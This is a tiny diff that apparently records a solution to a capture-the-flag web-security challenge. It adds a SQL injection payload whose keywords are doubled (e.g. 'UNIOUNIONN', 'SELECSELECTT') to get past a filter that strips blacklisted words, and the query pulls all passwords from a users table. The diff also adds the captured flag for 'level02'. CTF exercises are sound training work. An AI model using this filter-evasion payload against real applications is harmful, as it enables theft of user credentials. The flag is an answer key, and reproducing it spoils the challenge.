@@ -1,0 +1,3 @@
+-1 UNIOUNIONN SELECSELECTT 'xyz', GROUGROUPP_CONCAT(password) FROFROMM users;-- 
+
+level02:WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
